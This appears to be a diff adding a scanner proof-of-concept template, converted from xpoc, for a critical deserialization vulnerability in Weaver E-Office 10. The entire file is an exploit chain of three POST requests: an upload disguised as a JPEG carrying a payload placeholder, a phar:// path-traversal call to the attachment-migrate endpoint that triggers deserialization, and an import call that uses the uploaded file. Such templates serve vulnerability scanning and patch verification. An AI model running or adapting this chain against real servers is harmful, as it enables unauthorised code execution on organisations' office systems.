@@ -1,0 +1,30 @@
+id: yaml-poc-weaver-weaver_e_office-deserialization-CT-1156977
+info:
+  name: Yaml Poc Weaver Weaver_E_Office Deserialization Ct 1156977
+  author: yuxiang.cai
+  severity: critical
+  description: 'Converted from xpoc: yaml-poc-weaver-weaver_e_office-deserialization-CT-1156977'
+  tags: deserialization
+  reference: []
+http:
+- method: POST
+  path:
+  - /eoffice10/server/public/api/attachment/atuh-file
+  body: "--{{boundary}}\r\nContent-Disposition: form-data; name=\"Filedata\"; filename=\"\
+    register.inc\"\r\nContent-Type: image/jpeg\r\n\r\n{{payload}}\r\n--{{boundary}}--"
+  headers:
+    Accept: string("*/*")
+    Accept-Encoding: gzip, deflate
+    Content-Type: multipart/form-data; boundary={{boundary}}
+- method: POST
+  path:
+  - /eoffice10/server/public/api/attachment/path/migrate
+  body: source_path=&desc_path=phar%3A%2F%2F..%2F..%2F..%2F..%2Fattachment%2F
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+- method: POST
+  path:
+  - /eoffice10/server/public/api/empower/import
+  body: type=tttt&file={{attachment_id}}
+  headers:
+    Content-Type: application/x-www-form-urlencoded
